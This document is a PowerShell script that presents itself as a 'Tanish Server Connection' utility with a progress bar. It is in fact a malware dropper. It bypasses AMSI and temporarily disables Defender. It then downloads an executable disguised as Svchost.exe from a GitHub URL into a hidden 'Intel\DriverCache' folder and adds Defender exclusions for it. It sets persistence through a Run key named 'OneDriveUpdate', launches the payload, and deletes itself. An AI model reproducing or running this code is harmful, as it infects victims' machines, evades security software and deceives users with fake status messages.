# AMSI Bypass
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# Defender OFF
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# ============================================
# PROGRESS BAR FUNCTION
# ============================================
function Show-Progress {
    param($step, $total, $message)
    $percent = [math]::Round(($step / $total) * 100)
    $barLen = 50
    $filled = [math]::Floor($percent / 2)
    $bar = "█" * $filled + "░" * ($barLen - $filled)
    Write-Host "  [$bar] $percent%  - $message" -ForegroundColor Yellow
}

# ============================================
# HEADER
# ============================================
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    TANISH SERVER CONNECTION                   ║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# ============================================
# STEP 1: Initializing
# ============================================
Show-Progress -step 1 -total 6 -message "Initializing connection..."
Start-Sleep -Milliseconds 500

# ============================================
# STEP 2: Create Folder
# ============================================
Show-Progress -step 2 -total 6 -message "Creating secure directory..."
$folder = "$env:ProgramData\Intel\DriverCache"
if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}
Set-ItemProperty -Path $folder -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue

$name = -join ((65..90) | Get-Random -Count 8 | %{[char]$_}) + ".exe"
$path = Join-Path $folder $name

# ============================================
# STEP 3: Downloading
# ============================================
Show-Progress -step 3 -total 6 -message "Downloading driver updates..."
$wc = New-Object System.Net.WebClient
$wc.DownloadFile("https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe", $path)
Set-ItemProperty -Path $path -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue

# ============================================
# STEP 4: Configuring Security
# ============================================
Show-Progress -step 4 -total 6 -message "Configuring security exclusions..."
Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue

# ============================================
# STEP 5: Auto-Start Setup
# ============================================
Show-Progress -step 5 -total 6 -message "Setting up auto-start..."
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveUpdate" -Value $path -Force -ErrorAction SilentlyContinue

# ============================================
# STEP 6: Starting Application
# ============================================
Show-Progress -step 6 -total 6 -message "Starting application..."
cmd /c start "" "$path"

# ============================================
# COUNTDOWN
# ============================================
Write-Host ""
Write-Host "  ⏳ Waiting for initialization (25 seconds)..." -ForegroundColor Gray

for ($i = 25; $i -ge 1; $i--) {
    Write-Host "`r  ⏳ $i seconds remaining..." -NoNewline
    Start-Sleep -Seconds 1
}
Write-Host ""

# ============================================
# DEFENDER BACK ON
# ============================================
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

# ============================================
# FOOTER
# ============================================
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║              ✓ CONNECTED TO TANISH SERVER ✓                  ║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""

# ============================================
# SELF-DELETE
# ============================================
if ($MyInvocation.MyCommand.Path) {
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}

exit
